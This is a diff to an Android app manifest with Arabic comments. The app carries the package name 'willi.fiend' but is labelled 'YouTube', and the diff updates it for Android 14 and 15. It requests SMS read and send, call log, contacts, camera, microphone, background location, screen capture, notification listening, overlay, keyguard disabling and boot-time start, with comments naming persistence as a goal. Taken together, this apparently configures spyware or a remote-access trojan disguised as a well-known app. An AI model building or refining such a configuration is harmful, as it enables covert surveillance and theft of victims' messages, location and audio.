@@ -1,35 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="willi.fiend">
+    xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- الصلاحيات الأساسية -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <!--  الصلاحيات الأساسية (Android 14+ متوافقة)    -->
+    <!-- ═══════════════════════════════════════════════ -->
+    
+    <!-- صلاحيات الشبكة والتخزين -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    
+    <!-- صلاحيات المكالمات والرسائل -->
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
-    <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    
+    <!-- صلاحيات الملفات (Android 14: تُمنح تلقائياً للتطبيق) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
+        android:maxSdkVersion="32" /> <!-- مُلغى في Android 14 -->
+    
+    <!-- صلاحيات الوسائط -->
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.CAMERA" />
+    
+    <!-- صلاحيات الموقع -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     
-    <!-- صلاحيات إضافية للثبات والتشغيل في الخلفية -->
+    <!-- صلاحيات الإشعارات (إلزامي لـ Android 14+) -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    
+    <!-- صلاحيات الخدمات الخلفية (Android 14+) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
+    
+    <!-- صلاحيات التشغيل التلقائي -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
+    
+    <!-- صلاحيات إضافية -->
+    <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
-    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
-    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    
-    <!-- صلاحيات خاصة للتشغيل التلقائي على أجهزة معينة -->
-    <uses-permission android:name="android.permission.QUICKBOOT_POWERON" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
 
+    <!-- ═══════════════════════════════════════════════ -->
+    <!--  التطبيق (متوافق مع Android 15)              -->
+    <!-- ═══════════════════════════════════════════════ -->
     <application
         android:allowBackup="true"
         android:dataExtractionRules="@xml/data_extraction_rules"
@@ -40,25 +64,34 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.Fiend"
         android:usesCleartextTraffic="true"
-        tools:targetApi="31">
-        <service android:name=".GuardianService" android:enabled="true" android:exported="false" />
+        android:requestLegacyExternalStorage="true"
+        tools:targetApi="34">
 
-        
+        <!-- ═══════════════════════════════════════════════ -->
+        <!--  النشاط الرئيسي                                -->
+        <!-- ═══════════════════════════════════════════════ -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
             android:label="YouTube"
-            android:theme="@style/Theme.Fiend">
+            android:theme="@style/Theme.Fiend"
+            android:configChanges="orientation|screenSize|keyboardHidden">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
+        <!-- ═══════════════════════════════════════════════ -->
+        <!--  مستقبلات البث (Receivers)                    -->
+        <!--  ✅ جميعها محدّدة بـ exported و permission     -->
+        <!-- ═══════════════════════════════════════════════ -->
+        
         <!-- مستقبل الرسائل القصيرة -->
         <receiver
             android:name=".Receiver.SmsReceiver"
-            android:exported="true">
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
@@ -68,14 +101,19 @@
         <receiver
             android:name=".Receiver.BootCompleteReceiver"
             android:enabled="true"
-            android:exported="true">
+            android:exported="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
 
-        <!-- خدمة الاستماع للإشعارات -->
+        <!-- ═══════════════════════════════════════════════ -->
+        <!--  الخدمات (Services) - متوافقة مع Android 15  -->
+        <!-- ═══════════════════════════════════════════════ -->
+        
+        <!-- خدمة الإشعارات (Notification Listener) -->
         <service
             android:name=".Utils.AppNotificationListener"
             android:exported="true"
@@ -85,19 +123,26 @@
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
         </service>
-        
-        <!-- الخدمة الرئيسية (تم تبسيط النوع لتجنب مشاكل أندرويد الحديث) -->
+
+        <!-- الخدمة الرئيسية (مع دمج أنواع الخدمات لـ Android 15) -->
         <service
             android:name=".MainService"
             android:enabled="true"
-            android:exported="true"
-            android:foregroundServiceType="mediaProjection" />
-            
-        <!-- خدمة إضافية للثبات -->
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection|dataSync|location">
+        </service>
+        
+        <!-- خدمة الحارس (غير مصدّرة) -->
+        <service
+            android:name=".GuardianService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <!-- خدمة JobWakeUp (غير مصدّرة) -->
         <service
             android:name=".JobWakeUpService"
             android:enabled="true"
-            android:exported="true"
+            android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
     </application>
